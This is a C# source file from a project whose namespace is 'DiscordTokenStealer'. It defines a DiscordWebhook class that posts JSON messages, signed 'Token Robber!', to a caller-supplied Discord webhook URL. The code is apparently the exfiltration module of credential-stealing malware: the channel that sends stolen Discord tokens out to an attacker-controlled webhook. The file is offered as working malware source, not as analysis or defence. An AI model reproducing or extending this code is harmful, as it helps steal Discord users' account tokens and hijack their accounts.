using System;
using System.Net;
using System.Net.Http;
using System.Net.Http.Json;
using System.Threading.Tasks;

namespace DiscordTokenStealer.Discord
{
    public class DiscordWebhook : IDisposable
    {
        private readonly HttpClient _client;
        private DiscordWebhook(Uri webhookUri)
        {
            _client = new HttpClient(new HttpClientHandler { UseProxy = true, Proxy = new WebProxy() }, true)
            {
                BaseAddress = webhookUri
            };
        }

        public DiscordWebhook(string webhook) : this(new Uri(webhook))
        {

        }

        public async Task SendMessage(string message)
        {
            using HttpResponseMessage response = await _client.PostAsync(string.Empty, JsonContent.Create(new DiscordMessage(message, "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256")));
            response.EnsureSuccessStatusCode();
        }

        public async Task SendMessage<T>(T message) where T : DiscordMessage
        {
            using HttpResponseMessage response = await _client.PostAsync(string.Empty, JsonContent.Create(message));
            response.EnsureSuccessStatusCode();
        }

        public void Dispose()
        {
            _client.Dispose();
            GC.SuppressFinalize(this);
        }
    }
}
